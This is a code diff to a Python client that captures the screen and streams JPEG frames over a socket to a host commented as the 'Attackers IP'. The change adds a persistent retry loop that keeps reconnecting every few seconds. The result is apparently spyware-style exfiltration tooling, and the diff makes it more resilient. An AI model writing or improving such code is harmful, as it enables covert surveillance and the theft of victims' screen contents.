@@ -1,4 +1,3 @@
-
 import socket
 import struct
 import io
@@ -12,6 +11,7 @@ SERVER_HOST = '192.168.1.102' # Change this to Attackers IP
 SERVER_PORT = 1234       
 JPEG_QUALITY = 80          
 FPS = 30                   
+RETRY_INTERVAL = 5         # Seconds to wait before retrying connection
 
 # --- Global Variables ---
 client_socket = None
@@ -56,16 +56,24 @@ def send_screen():
                 if elapsed_time < (1 / FPS):
                     time.sleep((1 / FPS) - elapsed_time)
 
-    except (socket.error, ConnectionRefusedError) as e:
-        print(f"Connection error: {e}")
-        print("Ensure the server is running and accessible at the specified IP/port.")
+    except (socket.error, ConnectionResetError) as e:
+        print(f"Connection lost or error during data transfer: {e}")
+        print("Attempting to reconnect...")
+        # If connection is lost during send_screen, we break this loop
+        # and the outer start_client loop will handle reconnection.
     except mss.exception.ScreenShotError as e:
         print(f"Screen capture error: {e}")
         print("Please ensure you have necessary permissions for screen recording.")
+        is_running = False # Stop trying to send if screen capture fails
     except Exception as e:
-        print(f"An unexpected error occurred: {e}")
+        print(f"An unexpected error occurred in send_screen: {e}")
+        is_running = False # Stop on unexpected errors
     finally:
-        close_client()
+        # This finally block will be executed if the loop in send_screen exits
+        # either due to an error or `is_running` becoming False.
+        # We don't call close_client here directly, as start_client will handle it
+        # or attempt a re-connection.
+        pass
 
 def close_client():
     """Closes the client socket and shuts down the client."""
@@ -82,23 +90,36 @@ def close_client():
     sys.exit(0) # Exit the script cleanly
 
 def start_client():
-    """Initializes the client socket and connects to the server."""
-    global client_socket
+    """Initializes the client socket and connects to the server, with retry logic."""
+    global client_socket, is_running
 
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        print(f"Attempting to connect to {SERVER_HOST}:{SERVER_PORT}...")
-        client_socket.connect((SERVER_HOST, SERVER_PORT))
-        print("Connected to server.")
-        send_screen()
-    except ConnectionRefusedError:
-        print(f"Connection refused. Make sure the server is running on {SERVER_HOST}:{SERVER_PORT}")
-    except socket.error as e:
-        print(f"Socket error: {e}")
-    except Exception as e:
-        print(f"An error occurred during client startup: {e}")
-    finally:
-        close_client()
+    while True: # Continuous retry loop
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            print(f"Attempting to connect to {SERVER_HOST}:{SERVER_PORT}...")
+            client_socket.connect((SERVER_HOST, SERVER_PORT))
+            print("Connected to server.")
+            is_running = True # Reset is_running to True on successful connection
+            send_screen() # Start sending screens once connected
+            # If send_screen returns, it means the connection was lost or an error occurred.
+            # The loop will then go for a retry.
+
+        except ConnectionRefusedError:
+            print(f"Connection refused by {SERVER_HOST}:{SERVER_PORT}. Retrying in {RETRY_INTERVAL} seconds...")
+        except socket.timeout:
+            print(f"Connection attempt timed out to {SERVER_HOST}:{SERVER_PORT}. Retrying in {RETRY_INTERVAL} seconds...")
+        except socket.error as e:
+            print(f"Socket error during connection: {e}. Retrying in {RETRY_INTERVAL} seconds...")
+        except Exception as e:
+            print(f"An unexpected error occurred during client startup: {e}. Retrying in {RETRY_INTERVAL} seconds...")
+        finally:
+            # Always close the socket if it was created, before retrying
+            if client_socket:
+                try:
+                    client_socket.close()
+                except OSError as e:
+                    print(f"Error closing socket before retry: {e}")
+            time.sleep(RETRY_INTERVAL) # Wait before the next connection attempt
 
 if __name__ == "__main__":
     start_client()
